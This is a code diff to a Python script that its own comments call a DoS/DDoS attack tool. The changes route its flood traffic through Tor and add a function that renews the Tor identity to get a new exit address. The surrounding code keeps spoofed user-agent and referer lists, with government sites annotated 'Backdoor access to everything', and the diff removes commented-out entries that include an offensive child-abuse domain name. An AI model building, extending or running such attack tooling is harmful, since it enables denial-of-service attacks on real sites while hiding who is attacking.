@@ -25,6 +25,9 @@
  import socks  # Import the PySocks library
  from scapy.all import * #Network Scanning Tools for DOS and DDOS attacks
  import traceback
+ import stem.process  # For launching Tor
+ from stem import Signal
+ from stem.util.log import get_logger
  
 
  # Configuration
@@ -34,6 +37,8 @@
  PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 1024
  TIMEOUT = 5
  USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
+ TOR_PORT = 9050  # Default Tor port
+ CONTROL_PORT = 9051  # Tor control port
  
 
  USER_AGENTS = [
@@ -79,7 +84,7 @@
 
   # Connect via Tor if USE_TOR is True
   if USE_TOR:
-  socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)  # Default Tor port
+  socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT)  # Default Tor port
   socket.socket = socks.socksocket  # Use SOCKS socket
  
 
@@ -192,7 +197,15 @@
   t.start()
  
 
- # Additional methods to increase attack efficiency
+ # Function to renew Tor identity
+ def renew_tor_identity():
+  try:
+  with Controller.from_port(port=CONTROL_PORT) as controller:
+  controller.authenticate(password="your_tor_control_password")  # Replace with your Tor control password if set
+  controller.signal(Signal.NEWNYM)
+  log("\033[32mSuccessfully renewed Tor identity.\033[0m")  # Dark Green
+  except Exception as e:
+  log(f"\033[31mFailed to renew Tor identity: {e}\033[0m")  # Dark Red
  
 
  # List of Referers (Modified)
@@ -256,17 +269,6 @@
   "https://developers.google.com/speed/pagespeed/insights/",
   "https://webpagetest.org/",
   "https://www.thinkwithgoogle.com/intl/en-gb/feature/testmysite/",
-  # The below sites were removed because they do not exist or are harmful.
-  # "http://childporn.org/",  # .Onion support
-  # "http://darkweb.org/",  # .Onion support
-  # "http://deepweblinks.com/",  # .Onion support
-  # "http://torlink.com/",  # .Onion support
-  # "https://fuckyou.gov/",  # .Onion support
-  # "https://fuckyou.mil/",  # .Onion support
-  # "https://fuckyou.com/",  # .Onion support
-  # "https://fuckyou.net/",  # .Onion support
-  # "https://fuckyou.org/",  # .Onion support
-  # "https://fuckyou.mil/",  # .Onion support
   "https://www.nsa.gov/",  # Backdoor access to everything
   "https://www.cia.gov/",  # Backdoor access to everything
   "https://www.fbi.gov/",  # Backdoor access to everything
